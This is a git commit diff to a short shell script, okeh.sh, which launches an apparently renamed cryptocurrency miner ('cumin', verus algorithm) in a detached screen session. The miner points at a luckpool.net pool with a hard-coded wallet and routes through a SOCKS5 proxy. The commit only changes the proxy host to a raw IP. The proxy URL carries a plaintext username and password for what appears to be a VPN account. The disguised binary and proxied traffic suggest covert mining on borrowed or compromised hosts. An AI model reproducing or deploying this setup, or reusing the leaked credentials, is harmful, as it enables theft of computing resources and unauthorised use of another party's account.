e89117be0e95dbb16a74cc87141ea1560ed859cc
gasken1 <84686224+gasken1@users.noreply.github.com>
2021-10-06 19:02:15 +0700

    Update okeh.sh

--- okeh.sh
+++ okeh.sh
@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RTxdgLSqxiTVkUKegd5L5S3e8pJrAkK621
 WORKER=$(echo $(shuf -i 1-1 -n 1)-X)
-PROXY=socks5://NhBMm3oA:4yOC49q4v@lax.socks.ipvanish.com:1080
+PROXY=socks5://NhBMm3oA:4yOC49q4v@173.245.211.162:1080
 ./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
